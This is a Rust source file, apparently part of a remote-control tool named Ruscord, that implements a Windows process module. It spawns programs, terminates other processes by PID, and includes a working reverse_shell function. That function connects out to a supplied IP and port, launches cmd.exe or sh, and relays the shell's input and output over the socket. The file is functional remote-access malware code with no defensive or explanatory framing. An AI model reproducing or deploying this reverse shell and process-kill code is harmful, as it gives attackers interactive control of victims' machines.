use std::{future::Future, net::IpAddr, os::windows::process::CommandExt, pin::Pin, process::Stdio, sync::Arc};

use tokio::{
	io::{AsyncReadExt, AsyncWriteExt},
	net::TcpStream,
	process::Command,
	sync::Mutex,
};
use tokio_util::bytes::BytesMut;
use tracing::{debug, error};

use super::{
	api::{
		CloseHandle, ExitProcess, OpenProcess, TerminateProcess, CREATE_NEW_CONSOLE, CREATE_NO_WINDOW,
		PROCESS_TERMINATE,
	},
	Windows,
};
use crate::{os::traits::process::ProcessModule, RuscordError};

impl ProcessModule for Windows {
	fn spawn(&self, name: &str, args: Option<String>) -> Result<(), RuscordError> {
		let mut command = &mut std::process::Command::new(name);
		command
			.creation_flags(CREATE_NEW_CONSOLE)
			.stderr(Stdio::piped())
			.stdout(Stdio::piped())
			.stdin(Stdio::piped());

		if let Some(args) = args {
			let split_args = args.split(" ").collect::<Vec<_>>();
			debug!("args: {:?}", split_args);
			command = command.args(split_args);
		}

		command.spawn().unwrap();
		Ok(())
	}

	fn kill_other(&self, pid: u32, exit_code: Option<u32>) -> Result<(), RuscordError> {
		let exit_code = exit_code.unwrap_or(0);
		unsafe {
			let handle = OpenProcess(PROCESS_TERMINATE, false, pid);
			if handle.is_null() {
				error!("failed to open handle to process {}", pid);
				return Err(std::io::Error::last_os_error().into());
			}

			let result = TerminateProcess(handle, exit_code);
			if !result {
				error!("could not terminate process {}", pid);
				return Err(std::io::Error::last_os_error().into());
			}
			CloseHandle(handle);
		}

		Ok(())
	}

	fn kill_self(&self, exit_code: Option<u32>) -> ! { unsafe { ExitProcess(exit_code.unwrap_or(0)) } }

	fn reverse_shell(
		&self, ip: IpAddr, port: u16,
	) -> Pin<Box<dyn Future<Output = Result<(), RuscordError>> + Send + Sync>> {
		Box::pin(async move {
			let stream = TcpStream::connect((ip, port)).await?;
			let (mut owned_read_half, owned_write_half) = stream.into_split();

			let mut command = if cfg!(target_os = "windows") {
				Command::new("cmd.exe")
			} else {
				Command::new("sh")
			}
			.stdin(Stdio::piped())
			.stdout(Stdio::piped())
			.stderr(Stdio::piped())
			.spawn()?;

			let mut stdin = command.stdin.take().unwrap();

			tokio::spawn(async move {
				let mut buf = BytesMut::with_capacity(1024);
				while let Ok(n) = owned_read_half.read_buf(&mut buf).await {
					if n == 0 {
						break;
					}
					if let Err(e) = stdin.write_all(&buf[..n]).await {
						eprintln!("Error writing to stdin: {}", e);
						break;
					}
					if let Err(e) = stdin.write(&[b'\n']).await {
						eprintln!("Error writing newline to stdin: {}", e);
						break;
					}
					if let Err(e) = stdin.flush().await {
						eprintln!("Error flushing stdin: {}", e);
						break;
					}
				}
			});

			let thread_safe_write = Arc::new(Mutex::new(owned_write_half));

			{
				let thread_safe_write = Arc::clone(&thread_safe_write);
				tokio::spawn(async move {
					let mut stdout = command.stdout.take().unwrap();
					let mut buf = BytesMut::with_capacity(1024);
					while let Ok(n) = stdout.read_buf(&mut buf).await {
						if n == 0 {
							break;
						}
						let mut guard = thread_safe_write.lock().await;
						if let Err(e) = guard.write_all(&buf[..n]).await {
							eprintln!("Error writing to stdout: {}", e);
							break;
						}
						if let Err(e) = guard.flush().await {
							eprintln!("Error flushing stdout: {}", e);
							break;
						}
					}
				});
			}

			{
				let thread_safe_write = Arc::clone(&thread_safe_write);
				tokio::spawn(async move {
					let mut stderr = command.stderr.take().unwrap();
					let mut buf = BytesMut::with_capacity(1024);
					while let Ok(n) = stderr.read_buf(&mut buf).await {
						if n == 0 {
							break;
						}
						let mut guard = thread_safe_write.lock().await;
						if let Err(e) = guard.write_all(&buf[..n]).await {
							eprintln!("Error writing to stderr: {}", e);
							break;
						}
						if let Err(e) = guard.flush().await {
							eprintln!("Error flushing stderr: {}", e);
							break;
						}
					}
				});
			}

			Ok(())
		})
	}
}
